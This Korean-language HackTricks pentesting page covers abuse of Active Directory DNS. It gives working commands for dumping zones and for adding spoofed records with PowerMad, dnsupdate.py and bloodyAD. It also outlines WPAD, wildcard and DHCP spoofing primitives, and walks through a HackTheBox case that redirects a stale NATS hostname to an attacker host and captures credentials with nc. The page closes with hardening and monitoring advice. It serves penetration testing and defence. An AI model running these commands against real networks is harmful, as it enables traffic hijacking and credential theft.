# AD DNS 레코드

{{#include ../../banners/hacktricks-training.md}}

기본적으로 Active Directory에서는 **모든 사용자**가 Domain 또는 Forest DNS 존의 **모든 DNS 레코드**를 **열거**할 수 있으며, 이는 zone transfer와 유사합니다 (AD 환경에서 사용자는 DNS 존의 하위 객체를 나열할 수 있습니다).

도구 [**adidnsdump**](https://github.com/dirkjanm/adidnsdump)는 존 내의 **모든 DNS 레코드**를 **열거**하고 **내보내기**할 수 있어 내부 네트워크의 recon 목적으로 사용됩니다.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
> adidnsdump v1.4.0 (April 2025)는 JSON/Greppable (`--json`) 출력, 멀티스레드 DNS 해석 및 LDAPS 바인딩 시 TLS 1.2/1.3 지원을 추가합니다

For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## 레코드 생성 / 수정 (ADIDNS spoofing)

기본적으로 **Authenticated Users** 그룹은 zone DACL에 **Create Child** 권한이 있어, 모든 도메인 계정(또는 컴퓨터 계정)은 추가 레코드를 등록할 수 있습니다. 이는 traffic hijacking, NTLM relay coercion 또는 full domain compromise에 사용될 수 있습니다.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py는 Impacket ≥0.12.0에 포함되어 있습니다)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## 일반적인 공격 프리미티브

1. **Wildcard record** – `*.<zone>`는 AD DNS 서버를 LLMNR/NBNS spoofing과 유사한 엔터프라이즈 전체 응답기로 바꿉니다. NTLM 해시를 가로채거나 LDAP/SMB로 릴레이하는 데 악용될 수 있습니다. (WINS-lookup 비활성화 필요.)
2. **WPAD hijack** – `wpad`를 추가하거나 공격자 호스트를 가리키는 **NS** 레코드를 추가( Global-Query-Block-List 우회)하여 아웃바운드 HTTP 요청을 투명하게 프록시하고 자격증명을 수집할 수 있습니다. Microsoft가 wildcard/DNAME 우회(CVE-2018-8320)를 패치했지만 **NS-records still work**.
3. **Stale entry takeover** – 이전에 워크스테이션에 속해 있던 IP 주소를 인계받으면 연결된 DNS 엔트리는 여전히 해석되어 resource-based constrained delegation 또는 Shadow-Credentials 공격을 DNS를 전혀 변경하지 않고도 가능하게 합니다.
4. **DHCP → DNS spoofing** – 기본 Windows DHCP+DNS 배포에서는 동일 서브넷의 인증되지 않은 공격자가 위조된 DHCP 요청을 전송해 동적 DNS 업데이트를 트리거함으로써 기존의 모든 A 레코드(도메인 컨트롤러 포함)를 덮어쓸 수 있습니다 (Akamai “DDSpoof”, 2023). 이로 인해 Kerberos/LDAP에 대한 machine-in-the-middle이 가능해져 전체 도메인 탈취로 이어질 수 있습니다.
5. **Certifried (CVE-2022-26923)** – 제어하는 머신 계정의 `dNSHostName`을 변경하고 일치하는 A 레코드를 등록한 다음 해당 이름으로 인증서를 요청하여 DC를 가장할 수 있습니다. **Certipy**나 **BloodyAD** 같은 도구들이 이 흐름을 완전히 자동화합니다.

---

### 오래된 동적 레코드를 통한 내부 서비스 하이재킹 (NATS 사례 연구)

동적 업데이트가 모든 인증 사용자에 대해 열려 있으면, **등록이 취소된 서비스 이름을 재등록하여 공격자 인프라로 지정할 수 있습니다**. Mirage HTB DC는 DNS scavenging 이후 `nats-svc.mirage.htb` 호스트명을 노출했으므로, 권한이 낮은 사용자는 누구나 다음을 할 수 있었습니다:

1. **레코드가 없는지 확인**하고 `dig`로 SOA를 확인합니다:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **레코드를 재생성** 그들이 제어하는 외부/VPN 인터페이스를 향하도록:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. NATS 클라이언트는 자격 증명을 보내기 전에 하나의 `INFO { ... }` 배너를 볼 것으로 기대하므로, 실제 브로커에서 정당한 배너를 복사하는 것만으로도 비밀을 수집하기에 충분합니다:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.

4. **Pivot with the captured creds** – Mirage에서는 탈취된 NATS 계정이 JetStream 접근을 허용하여, 재사용 가능한 AD 사용자명/비밀번호를 포함한 과거 인증 이벤트들이 노출되었습니다.

이 패턴은 HTTP APIs, RPC, MQTT 등과 같이 보안되지 않은 TCP 핸드셰이크에 의존하는 모든 AD-integrated 서비스에 적용됩니다: DNS 레코드가 하이재킹되면 공격자는 곧 그 서비스가 됩니다.

---

## 탐지 및 보안 강화

* 민감한 존에 대해 **Authenticated Users**에게 *Create all child objects* 권한을 허용하지 말고, 동적 업데이트는 DHCP에서 사용하는 전용 계정으로 위임하세요.
* 동적 업데이트가 필요하다면 존을 **Secure-only**로 설정하고 DHCP에서 **Name Protection**을 활성화하여 소유자 컴퓨터 객체만 자신의 레코드를 덮어쓸 수 있도록 하세요.
* DNS Server 이벤트 ID 257/252 (dynamic update), 770 (zone transfer) 및 `CN=MicrosoftDNS,DC=DomainDnsZones`로의 LDAP 쓰기를 모니터링하세요.
* 위험한 이름(`wpad`, `isatap`, `*`)은 의도적으로 무해한 레코드를 추가하거나 Global Query Block List를 통해 차단하세요.
* DNS 서버를 최신 패치 상태로 유지하세요 — 예: RCE 버그 CVE-2024-26224 및 CVE-2024-26231은 **CVSS 9.8**에 도달했으며 Domain Controllers에 대해 원격으로 악용될 수 있습니다.



## 참고 자료

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, 여전히 wildcard/WPAD 공격에 대한 사실상 기준 문헌)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
